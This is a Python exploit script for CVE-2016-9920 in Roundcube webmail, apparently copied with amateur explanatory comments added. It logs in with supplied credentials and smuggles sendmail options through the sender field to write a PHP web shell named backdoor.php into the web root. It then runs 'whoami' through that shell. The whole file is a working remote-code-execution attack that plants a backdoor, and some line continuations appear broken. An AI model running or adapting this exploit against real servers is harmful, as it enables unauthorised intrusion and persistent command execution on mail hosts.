#!/usr/bin/env python
#allows python to run even if installed in unsual location


#current issue, cookie cant be string!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#https://github.com/HopeAnnihilator/exploit-CVE-2016-9920/blob/master/myshittyattempt.py



#import modules
import re
#regular expressions matching module
import requests
#apache2 licensed http library to make interaction easier
import argparse
#used to define required arguments

#define default values
class Exploit:
    def __init__(self, host, user, pwd, path, www_path):
        self.__headers = {"Content-Type": "application/x-www-form-urlencoded"}
        self.__url = "http://" + host + "/" + path + "/"
        self.__www_folder = www_path
        self.__compose_id = None
        self.__request_token = None
        self.__cookie = None
        self.__username = user
        self.__password = pwd
    
    #go to the specified webpage and request the cookie and some token? can be bypassed
    def __auth(self):
        data = requests.get(self.__url)
        match = re.search('"request_token":"([^"]+)"', data.text)
        self.__request_token = match.group(0).split(":")[1].replace("\"", "")
        self.__cookie = dict(roundcube_sessid=data.cookies["roundcube_sessid"])
    
    #attempt to login with given credentials, can be bypassed
    def __login(self):
        payload = "_token=" + self.__request_token + \
                "&_task=login&_action=login&_timezone=1&_dstactive=1&_url=&_user=" + \
                self.__username + "&_pass=" + self.__password

        #finish the login (i think)
        data = requests.post(self.__url + "?_task=login", headers=self.__headers,
                cookies=self.__cookie, data=payload, allow_redirects=False)
    
        #grab the value token(_token=ad213db79d14cba0e996676bce217b9a) from login request and also collect cookie, Cookie: elastixSession=nbpjhntfb8g616vtsl1gfmf9t1
        #can be bypassed
        if data.status_code == 302:
            self.__request_token = data.headers["Location"].split("token=")[1]
            self.__cookie = data.cookies

    #navigate to mailbox and compose a new msg, send the collected cookie when doing? can be bypassed
    def __compose(self):
        data = requests.get(self.__url + "?_task=mail&_mbox=INBOX&_action=compose",
                cookies=self.__cookie, allow_redirects=False)
        
        #collect the id given in the url of mail composing, can be bypassed
        if data.status_code == 302:
            self.__compose_id = data.headers['Location'].split("id=")[1]

    #put obtained information into payload
    def __mail(self):
        backdoor = self.__www_folder + "/backdoor.php" #sets the location of stored file
        cmd = "<?php echo passthru($_GET['cmd']); ?>" #allows user to execute system commands from php file
        payload = "_token=" + self.__request_token + \ 
                "&_task=mail&_action=send&_id=" + self.__compose_id + \ 
                "&_attachments=&_from=example@example.com -OQueueDirectory=/tmp -X" + backdoor + \
                "&_to=example@pWnexAmplE.sh&_cc=&_bcc=&_replyto=&_followupto=&_subject=" + cmd + \ 
                "&editorSelector=plain&_priority=0&_store_target=" \ 
                "&_draft_saveid=&_draft=&_is_html=0&_framed=1" \ 
                "&_message=pwn" 
        #use the token from login
        #use the compose id 
        #insert the location where file is stored
        #insert the code allow command execution
        #requirements to send msg
        #requirements to send msg
        #bs filler info
        
        #send the payload through given url with header, given cookie and payload, can be bypassed
        data = requests.post(self.__url + "?_task=mail&_lang=en_US&_framed=1",
                headers=self.__headers, cookies=self.__cookie, data=payload)

        #give feedback to user
        if "Message sent successfully" in data.text:
            print("[+] Target exploited, acessing shell at " + self.__url + "backdoor.php")
            print("[+] Running whoami: " + self.__trigger())
            print("[+] Done")
        else:
            print("[!] Failed")

    #attempt to send the command whoami and collect the returned info
    def __trigger(self):
        data = requests.get(self.__url + "backdoor.php?cmd=whoami")
        match = re.search('Subject: ([^"]+)', data.text)
        return match.group(0) \
                .split("\n")[0] \
                .split("Subject:")[1] \
                .replace(" ", "")

    #tell what order to run
    def run(self):
        self.__auth()
        self.__login()
        self.__compose()
        self.__mail()

#define what input the user provides and require the info, also creator claiming his work
def main(args):
    print("[+] CVE-2016-9920 exploit by t0kx")
    print("[+] Exploiting " + args.host)

    exploit = Exploit(args.host, args.user,
            args.pwd, args.path, args.www_path)
    exploit.run()

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--user', required=True)
    parser.add_argument('--pwd', required=True)
    parser.add_argument('--path', required=True)
    parser.add_argument('--www_path', required=True)
    args = parser.parse_args()

    main(args)
